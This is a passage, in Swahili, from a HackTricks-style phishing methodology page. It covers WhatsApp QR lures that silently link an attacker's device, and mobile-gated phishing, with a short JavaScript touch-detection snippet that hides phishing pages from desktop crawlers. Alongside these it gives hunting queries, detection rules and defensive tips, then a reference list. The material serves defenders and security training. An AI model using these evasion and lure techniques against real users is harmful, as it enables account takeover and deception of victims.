* Ukurasa wa lures (mfano, fake ministry/CERT “channel”) unaonyesha WhatsApp Web/Desktop QR na unaamrisha mwathirika uscan, kwa kimya kuchukua hatua ya kumongeza mshambuliaji kama **linked device**.
* Mshambuliaji hupata mara moja muonekano wa chat/contact hadi session iondolewe. Waathiriwa wanaweza baadaye kuona notifikesheni ya “new device linked”; watetezi wanaweza kutafutiza matukio yasiyotegemewa ya device-link muda mfupi baada ya kutembelea kurasa za QR zisizo za kuaminika.

### Mobile‑gated phishing to evade crawlers/sandboxes
Waendeshaji kwa kiasi kikubwa wameweka mtiririko wao wa phishing nyuma ya ukaguzi rahisi wa kifaa ili crawlers za desktop zisifikie kurasa za mwisho. Mchoro wa kawaida ni script ndogo inayojaribu DOM yenye uwezo wa kugusa (touch-capable) na kutuma matokeo kwa endpoint ya server; wateja wasiokuwa wa mobile wanapokea HTTP 500 (au ukurasa tupu), wakati watumiaji wa mobile wanatumiwa mtiririko kamili.

Mfupi wa snippet wa client (mantiki ya kawaida):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` mantiki (iliyorahisishwa):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Tabia za server zinazoshuhudiwa mara kwa mara:
- Inaweka session cookie wakati wa mzigo wa kwanza.
- Inakubali `POST /detect {"is_mobile":true|false}`.
- Inarudisha 500 (au placeholder) kwa GETs za baadaye wakati `is_mobile=false`; inawasilisha phishing tu ikiwa `true`.

Uwindaji na kanuni za utambuzi:
- query ya urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetry ya wavuti: mpangilio wa `GET /static/detect_device.js` → `POST /detect` → HTTP 500 kwa non‑mobile; njia halali za waathiriwa wa mobile hurudisha 200 na HTML/JS ya kuendelea.
- Zuia au chunguza kwa kina kurasa zinazoweka maudhui kwa sharti la `ontouchstart` au ukaguzi mwingine wa kifaa.

Vidokezo vya ulinzi:
- Endesha crawlers zenye mobile‑like fingerprints na JS imewezeshwa ili kufichua maudhui yaliyofungwa.
- Toa tahadhari kuhusu majibu yenye shaka ya 500 yanayofuata `POST /detect` kwenye domains zilizojisajili hivi karibuni.

## Marejeo

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
